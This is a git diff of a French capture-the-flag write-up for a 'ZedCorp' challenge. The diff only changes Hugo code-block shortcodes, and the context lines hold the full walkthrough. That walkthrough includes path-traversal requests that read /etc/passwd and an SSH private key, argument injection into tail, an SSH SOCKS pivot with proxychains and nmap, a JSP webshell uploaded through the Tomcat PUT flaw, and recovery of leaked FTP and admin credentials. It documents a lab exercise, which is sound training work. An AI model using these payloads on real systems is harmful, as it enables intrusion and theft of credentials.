@@ -28,14 +28,14 @@ L'énoncé nous donne deux ports TCP, un service HTTP et un accès SSH. Nous pou
 
 En cherchant un peu sur le site, nous pouvons remarquer la présence d'un fichier `robots.txt` qui nous donne des pistes à creuser, notamment le répertoire `logs`.
 
-{{< code lang="plaintext" icon="file-text-o" title="robots.txt" >}}
+{{< highlight plaintext >}}
 User-agent: *
 Disallow: /assets
 Disallow: /js
 Disallow: /api
 Disallow: /logs
 Disallow: /images
-{{< /code >}}
+{{< /highlight >}}
 
 Fort heureusement, l'auteur du challenge à été gentil et nous a laissé du Directory Listing. Nous avons donc 8 fichiers de logs :
 
@@ -43,7 +43,7 @@ Fort heureusement, l'auteur du challenge à été gentil et nous a laissé du Di
 
 Dans le fichier `access-details.log`, nous trouvons des échanges HTTP complet, dont plusieurs tentatives d'authentification sur http://ctf.hacklab-esgi.org:5008/login.php :
 
-{{< code lang="http" >}}
+{{< highlight http >}}
 POST /login.php HTTP/1.1
 Host: 192.168.123.133
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
@@ -58,13 +58,13 @@ Connection: keep-alive
 Upgrade-Insecure-Requests: 1
 
 username=admin&password=pxrAW7a4HNMBw86bc
-{{< /code >}}
+{{< /highlight >}}
 
 ## Zone d'administration et monitoring des logs
 
 Nous pouvons donc nous authentifier sur le site de _ZedCorp_ avec le compte **admin**. L'interface d'administration propose de visualiser les journaux d'accès et d'erreur du serveur Web. Pour cela, une requête `POST` est envoyée avec le nom du fichier de log en paramètre. Naturellement, on essaye de récupérer un autre fichier et cela fonctionne merveilleusement bien :)
 
-{{< code lang="http" >}}
+{{< highlight http >}}
 POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
 Host: ctf.hacklab-esgi.org:5008
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
@@ -79,8 +79,8 @@ Cookie: PHPSESSID=urj94cee9424reig3bje31b0a2
 Upgrade-Insecure-Requests: 1
 
 log=../../../../../../../../etc/passwd
-{{< /code >}}
-{{< code lang="plaintext" icon="file-text-o" title="/etc/passwd" >}}
+{{< /highlight >}}
+{{< highlight plaintext >}}
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
 systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
@@ -91,13 +91,13 @@ messagebus:x:105:110::/var/run/dbus:/bin/false
 sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
 test:x:1001:1001:,,,:/home/test:/usr/sbin/nologin
 trobin:x:1004:1004:Thibaud Robin,8,0145674356,0145674356,Trainee full stack developer:/home/trobin:/bin/bash
-{{< /code >}}
+{{< /highlight >}}
 
 ## Se connecter en SSH
 
 N'oublions pas que l'énoncé comportait un port SSH (TCP/5007). Précédement, nous avons vu qu'il y a deux utilisateurs sur le serveur : **test** et **trobin**. En utilisant la LFI, nous pouvons trouver les clés RSA de l'utilisateur **test** dans le répertoire `/home/test/.ssh` :
 
-{{< code lang="plaintext" icon="file-text-o" title="/home/test/.ssh/id_rsa" >}}
+{{< highlight plaintext >}}
 svu/zHqzzrRsm1un3Ikcvy0lnG31sg6kJ8EXH6ECgYEApe/Wv2KD+EDRwf4BQ19W
 a2gPYIQgqraR+WHG0mL3diC58Y+uJMz3rulV47KZuYNrLL05vfLxNcEbRoKW6H1g
 NmFXExuFkuPpG6oLEYVM62Bm8pksA/tkC907CY/cG4sGUYB4Rv0qKHCXrByMqp/u
@@ -108,11 +108,11 @@ CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
 VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
 zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
 -----END RSA PRIVATE KEY-----
-{{< /code >}}
+{{< /highlight >}}
 
 Hum, la clé RSA privée n'a pas l'air complète. Effectivement, pour afficher les logs (fonctionnalité d'origine de la zone d'administration, rappelez-vous ...), le fichier est tronqué pour n'afficher que les 10 dernières lignes ... 10 lignes ... `tail` ? Essayons avec l'option `-n 100` ...
 
-{{< code lang="http" >}}
+{{< highlight http >}}
 POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
 Host: ctf.hacklab-esgi.org:5008
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
@@ -127,9 +127,9 @@ Cookie: PHPSESSID=urj94cee9424reig3bje31b0a2
 Upgrade-Insecure-Requests: 1
 
 log=../../../../../../../../home/test/id_rsa -n 100
-{{< /code >}}
+{{< /highlight >}}
 
-{{< code lang="plaintext" icon="file-text-o" title="/home/test/.ssh/id_rsa" >}}
+{{< highlight plaintext >}}
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEA1f3hWbx2726sOiwm+gg8Td2261E7QSJhQHcQFEns7Ubonx6E
 +YU4BgzQt136gK42RwoGOph8H/Tu0zfjGIx9IQOIDG8VmCItfUDFCexoqoZB2cj2
@@ -157,11 +157,11 @@ CSSSQQKBgQCI3TUMYeR/4+86B6i2sldPVtn52QrOHeaDwRfZ1Z7TRYPY6gIvKBLd
 VVU6YcP0KwZUHeUOC7qNxSCTnB7FkANad+D/7a0MGqAGCmWChS5GD6zpqhW+tKkY
 zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
 -----END RSA PRIVATE KEY-----
-{{< /code >}}
+{{< /highlight >}}
 
 Et voilà, nous pouvons à présent nous connecter en SSH sur le port TCP/5007 avec le compte **test** :
 
-{{< code lang="console" icon="code" title="Console" >}}
+{{< highlight bash >}}
 host:~$ ssh -i id_rsa -p 5007 test@ctf.hacklab-esgi.org 
 Linux dev-server 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 
  
@@ -175,15 +175,15 @@ Linux dev-server 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
 Last login: Sat Apr  6 05:45:38 2019 from 94.228.190.38 
 This account is currently not available. 
 Connection to ctf.hacklab-esgi.org closed.
-{{< /code >}}
+{{< /highlight >}}
 
 ## SSH et Proxychains
 
 Évidement, pour ceux qui ont suivi, le compte **test** ne peut pas se connecter au serveur (`/usr/sbin/nologin`). Nous avons ici un indice, _"Do you know proxychains ?"_.
 
-{{< code lang="console" icon="code" title="Console" >}}
+{{< highlight bash >}}
 host:~$ ssh -N -D 5000 -i id_rsa -p 5007 test@ctf.hacklab-esgi.org
-{{< /code >}}
+{{< /highlight >}}
 
 Nous avons maintenant un proxy SOCKS5 qui donne accès au réseau interne accessible depuis le serveur de ZedCorp. Question : quelles sont les autres serveurs accessibles ?
 
@@ -197,18 +197,18 @@ Lorsque l'on essaye d'ajouter un `;` pour chaîner les commandes, le serveur ref
 
 Le but est de savoir quelle sont les autres serveurs voisins de celui-ci. En regardant les interfaces réseau (`ip a`), nous observons deux interfaces **ens192** (`10.10.40.2/29`) et **ens224** (`10.0.0.1/16`). Notre connexion SSH est établie sur l'interface **ens192**.
 
-{{< code lang="console" icon="code" title="Console" >}}
+{{< highlight bash >}}
 10.0.0.1:~$ ss -t
 State      Recv-Q Send-Q Local Address:Port      Peer Address:Port                
 ESTAB      0      0      10.10.40.2:ssh          X.X.X.X:48040                
 ESTAB      0      0      10.0.0.1:55480          10.0.0.1:http                 
 ESTAB      0      0      10.10.40.2:ssh          X.X.X.X:48418                
 ESTAB      0      0      ::ffff:10.0.0.1:http    ::ffff:10.0.0.1:55480
-{{< /code >}}
+{{< /highlight >}}
 
 Le réseau interne de ZedCorp semble donc se trouver sur le range `10.0.0.0/16`. Et c'est le fichier `/etc/hosts` qui nous donne la réponse que nous cherchions, à savoir les deux autres serveurs du réseau interne de _ZedCorp_.
 
-{{< code lang="plaintext" icon="file-text-o" title="/etc/hosts" >}}
+{{< highlight plaintext >}}
 127.0.0.1   localhost
 127.0.1.1   dev-server
 
@@ -220,7 +220,7 @@ Le réseau interne de ZedCorp semble donc se trouver sur le range `10.0.0.0/16`.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-{{< /code >}}
+{{< /highlight >}}
 
 Comme quoi, la RCE n'était pas forcément utile ...
 
@@ -228,7 +228,7 @@ Comme quoi, la RCE n'était pas forcément utile ...
 
 En utilisant Proxychains et Nmap, nous pouvons cartographier le réseau interne de _ZedCorp_ :
 
-{{< code lang="console" icon="code" title="Console" >}}
+{{< highlight bash >}}
 host:~$ proxychains nmap 10.0.0.2
 ProxyChains-3.1 (http://proxychains.sf.net) 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 00:35 CEST 
@@ -241,8 +241,8 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy 
 
 Nmap done: 1 IP address (1 host up) scanned in 4.74 seconds 
-{{< /code >}}
-{{< code lang="console" icon="code" title="Console" >}}
+{{< /highlight >}}
+{{< highlight bash >}}
 host:~$ proxychains nmap 10.0.0.3
 ProxyChains-3.1 (http://proxychains.sf.net) 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-06 00:35 CEST 
@@ -255,7 +255,7 @@ PORT   STATE SERVICE
 80/tcp open  http 
 
 Nmap done: 1 IP address (1 host up) scanned in 4.59 seconds
-{{< /code >}}
+{{< /highlight >}}
 
 Nous n'avons pas d'identifiants pour les accès SSH et FTP, le service AJP du serveur **project-server** (`10.0.0.2`) est authentifié et les comptes par défaut ont été modifiés, et le service Web du serveur **admin-server** (`10.0.0.3`) est protégé par une Basic-Auth.
 
@@ -281,7 +281,7 @@ Autre information sur la TODO-list : il est mentionné la mise en place de backu
 
 Les pages d'erreur obtenue sur le serveur Tomcat nous divulguent sur la version : **Apache Tomcat 7.0.41**. Une petite recherche rapide sur Internet nous informe que cette version est vulnérable à la [**CVE-2017-12617**](https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2017-12617) si jamais la méthode PUT est acceptée ... Et elle l'est. Nous poussons donc notre Webshell JSP sur le serveur :
 
-{{< code lang="http" >}}
+{{< highlight http >}}
 PUT /rookie.jsp/ HTTP/1.1
 Host: 10.0.0.2:8080
 Accept-Encoding: gzip, deflate
@@ -304,7 +304,7 @@ if(cmd != null) {
 }
 %>
 <pre><%=output %></pre>
-{{< /code >}}
+{{< /highlight >}}
 
 Le serveur nous répons avec `HTTP/1.1 201 Crée`, merveilleux, nous pouvons mainteant exécuter des commandes sur le serveur via la page http://10.0.0.0:8080/rookie.jsp.
 
@@ -314,7 +314,7 @@ Dans la TODO-list, nous avions vu le message suivant : _"Some credentials was fo
 
 En effet, les répertoires des utilisateurs ont été nettoyés, mais ont-ils été vraiment bien nettoyés ? Lorsque nous cherchons un peu sur le serveur, nous sommes mis sur la voie par les droits en lecture du fichier `/home/dcloutier/.bash_history` (-rw-r--r--), seul fichier `.bash_history` entre tous accessible en lecture. Et bingo, on y retrouve des identifiants FTP :
 
-{{< code lang="plaintext" icon="file-text-o" title="/home/dcloutier/.bash_history" >}}
+{{< highlight plaintext >}}
 [...]
 
 tar -czf - credentials.txt | openssl enc -e -aes256 -out credentials.tar.gz
@@ -326,22 +326,22 @@ lftp -c 'open -u backup,46t5r2e5t&2z! admin-server; put -O / credentials.tar.gz'
 lftp -c 'open -u backup,46t5r2e5t&2z! admin-server; put -O / ~/credentials.tar.gz' 
 
 [...]
-{{< /code >}}
+{{< /highlight >}}
 
 ## Connexion FTP et récupération des identifiants
 
 Grace aux identifiants ainsi trouvés, nous pouvons utiliser le compte **backup** pour nous connecter au FTP sur serveur d'administration (`10.0.0.3`) et récupérer le fichier `credentials.tar.gz` que l'utilisateur **dcloutier** y a déposé :
 
-{{< code lang="console" icon="code" title="Console" >}}
+{{< highlight bash >}}
 host:~$ proxychains lftp -u 'backup,46t5r2e5t&2z!' 10.0.0.3
 host:~$ openssl enc -d -aes256 -in credentials.tar.gz -out credentials.tgz --pass pass:daniel2019
 host:~$ tar -xcvf credentials.tgz
 host:~$ cat credentials.txt
-{{< /code >}}
+{{< /highlight >}}
 
 Nous obtenons enfin tous les sésames pour le serveur d'administration !
 
-{{< code lang="markdown" icon="file-text-o" title="credentials.txt" >}}
+{{< highlight markdown >}}
 CREDENTIALS 
 =========== 
 - Basic auth on http://admin-server:80 
@@ -358,7 +358,7 @@ CREDENTIALS
 
 - CEO Privileged test account on http://admin-server:80 
    + Username : ceo
-{{< /code >}}
+{{< /highlight >}}
 
 ## Site d'administration _ZedCorp_
 
